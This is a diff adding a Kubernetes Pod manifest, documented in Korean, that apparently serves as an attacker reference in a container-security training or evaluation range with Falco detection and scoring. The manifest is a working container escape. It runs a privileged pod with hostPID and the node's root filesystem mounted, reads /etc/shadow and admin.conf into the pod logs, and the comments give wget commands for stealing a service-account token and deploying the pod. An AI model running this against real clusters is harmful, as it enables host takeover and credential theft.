@@ -1,0 +1,51 @@
+# [Wave1 참조 — 베이스라인 미적용] 공격자가 T1610 단계에서 '배포하는' 악성 파드.
+#
+# ※ 이 디렉터리(attack-reference/)는 서브디렉터리라 `kubectl apply -f k8s/killchain`(비재귀)의
+#   대상이 아니다 → 베이스라인에 안 뜬다. '공격자가 런타임에 만든다'는 게 핵심(defense-reference/
+#   와 같은 취급: 사람이 walkthrough 하거나 god-view 로 대조할 때 보는 레퍼런스).
+#
+# 역할: 노드(호스트) 루트파일시스템을 hostPath 로 통째 마운트 + privileged 로, 컨테이너 밖
+#   호스트 자원에 접근(T1611 Escape to Host). command 가 호스트의 민감파일을 읽어 로그로 흘리면
+#   공격자가 파드 로그 API 로 회수한다(발판에 exec 스트리밍이 없어도 결과 수집 가능).
+#
+# ── 자동 공격자(발판 busybox wget + 탈취한 admin-sa Bearer 토큰)의 실제 벡터 ──
+#   1) 토큰 탈취:  wget -qO- http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/internal/admin-sa-token
+#                 → JSON 의 .data.token(base64) 을 base64 -d → admin-sa JWT
+#   2) (T1069) 권한 열거:  wget 로 /apis/authorization.k8s.io/v1/selfsubjectrulesreviews 에 POST → "pods create 가능" 확인
+#   3) (T1613) 네임스페이스 열거:  wget --header="Authorization: Bearer $TOK" .../api/v1/namespaces
+#   4) (T1610) 파드 배포:  wget --header="Authorization: Bearer $TOK" --header="Content-Type: application/yaml" \
+#                 --post-data="$(이 매니페스트)" https://kubernetes.default.svc/api/v1/namespaces/default/pods --no-check-certificate -qO-
+#   5) (T1611) 결과 회수:  wget --header="Authorization: Bearer $TOK" .../api/v1/namespaces/default/pods/pwn-escape/log  → /host/etc/shadow 내용
+#
+# god-view 채점:  (4)=감사 `admin-sa create pods` → T1610 / (5 실행 중)=Falco "Escape to host
+#   filesystem"(/host/etc read) → T1611.  방어: restrict_rbac(바인딩 삭제→create 403) +
+#   restrict_pod_security(default ns enforce=baseline → privileged/hostPath admission 거부) + delete_pod.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwn-escape
+  namespace: default
+  labels:
+    app.kubernetes.io/created-by: attacker        # 공격자 산출물 표식(god-view/정리용)
+spec:
+  # hostPID + privileged + hostPath('/') = 컨테이너 탈출의 교과서적 3종 세트.
+  hostPID: true
+  containers:
+    - name: escape
+      image: postgres:16-alpine                   # 이미 노드에 캐시된 이미지 재사용(풀 불필요)
+      command:
+        - sh
+        - -c
+        # 호스트 민감파일을 읽어 stdout(=파드 로그)으로. Falco 가 /host/etc read 를 포착(T1611).
+        - "cat /host/etc/shadow /host/etc/kubernetes/admin.conf 2>/dev/null; echo ESCAPE_DONE; sleep 3600"
+      securityContext:
+        privileged: true                          # ← PodSecurity enforce=baseline 이 거부하는 핵심 필드
+      volumeMounts:
+        - name: host-root
+          mountPath: /host                         # 노드 루트를 /host 로 — 공격자 규약(Falco 룰이 이 프리픽스를 본다)
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Never
